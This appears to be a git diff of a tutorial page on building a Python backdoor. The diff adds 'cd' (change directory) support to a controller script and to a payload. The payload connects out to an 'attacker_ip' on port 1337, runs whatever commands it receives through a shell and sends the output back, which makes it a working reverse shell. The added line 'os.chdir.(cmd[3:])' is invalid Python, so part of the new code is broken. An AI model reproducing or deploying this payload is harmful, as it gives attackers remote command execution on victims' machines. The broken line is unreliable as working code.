@@ -1,4 +1,4 @@
-<h2 align="center">Handle Exceptions</h2>
+<h2 align="center">Change Directory using Backdoor</h2>
 <p align="center"><img width="350" height="350" src="./src/banner_cnph.gif"></p>
 
 - - - - - - - - - - - - - - - - - - - - - -
@@ -32,6 +32,11 @@ while True:
 		connection.send(b"quit") # string
 		connection.close()
 		break
+
+	# Change Directory (cd)
+	elif cmd[:2] == "cd": # Check initial part (cd) slice using string [:index]
+		connection.send(bytes(cmd, "utf-8"))
+		continue
 		
 	connection.send(bytes(cmd, "utf-8"))
 	
@@ -41,12 +46,13 @@ while True:
 print("Server has stopped")
 ```
 ---
-#### Exception Error
-
 > [payload.py](payload.py)
 ```python
 import socket
 import subprocess
+
+# import a library for change directory
+import os
 
 payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -62,53 +68,22 @@ def send_data(ouput_data):
  
 while True:
 	cmd = payload.recv(2048)
+	cmd = cmd.decode("utf-8") # string
 	
-	if cmd == b"quit":
+	if cmd == "quit": # no longer need to decode with byte
 		payload.close()
 		break
-		
-	cmd = cmd.decode("utf-8") # string
-	output = subprocess.check_output(cmd, shell = True)
-	send_data(output)
-
-print("Disconnected") # display disconnection message
-```
----
-#### Handle Exceptions
-> [payload.py](payload.py)
-```python
-import socket
-import subprocess
-
-payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-payload.connect(("attacker_ip", 1337))
-
-print("Connected")
-
-def send_data(ouput_data):
-    size_of_data = len(ouput_data)
-    size_of_data = str(size_of_data)
-    payload.send(bytes(size_of_data, "utf-8"))
-    payload.send(ouput_data)
- 
-while True:
-	cmd = payload.recv(2048)
 	
-	if cmd == b"quit":
-		payload.close()
-		break
-		
-	cmd = cmd.decode("utf-8") # string
+	# Change Directory (cd)
+	elif cmd[:2] == "cd": # Check initial part (cd) slice using string [:index]
+		# use os module and chdir function (change directory)
+		os.chdir.(cmd[3:]) # give the command the 2nd argument after (cd)
+		continue
 
-	# Handle Exception
 	try:
 		output = subprocess.check_output(cmd, shell = True)
-	
-	# Check if there's exception
 	except subprocess.CalledProcessError:
 		send_data(b"Wrong command")
-
 	else:
 		send_data(output)
 
